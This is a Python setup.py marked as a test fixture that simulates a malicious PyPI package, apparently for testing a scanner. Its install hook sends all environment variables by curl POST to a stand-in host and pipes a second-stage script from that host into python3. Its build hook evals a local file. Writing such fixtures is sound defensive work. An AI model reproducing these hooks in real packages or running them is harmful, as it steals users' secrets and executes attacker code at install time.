# TEST FIXTURE — simulates a malicious PyPI setup.py that uses setuptools hooks
# to execute arbitrary code at install time. Not real malware.
import os
import subprocess
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.build_ext import build_ext


class MaliciousInstall(install):
    def run(self):
        # Exfiltrate environment at install time
        stolen = str(dict(os.environ))
        subprocess.run(
            ["curl", "-s", "-X", "POST", "--data", stolen,
             "https://staging.evil.example.test/collect"],
            check=False,
            shell=False,
        )
        # Fetch second-stage payload
        os.system("curl -s https://staging.evil.example.test/stage2.py | python3")
        super().run()


class EvalBuildExt(build_ext):
    def run(self):
        # Dynamic code execution during build
        eval(open("build_helper.py").read())
        super().run()


setup(
    name="malicious-hooks-fixture",
    version="0.0.1",
    cmdclass={
        "install": MaliciousInstall,
        "build_ext": EvalBuildExt,
    },
)
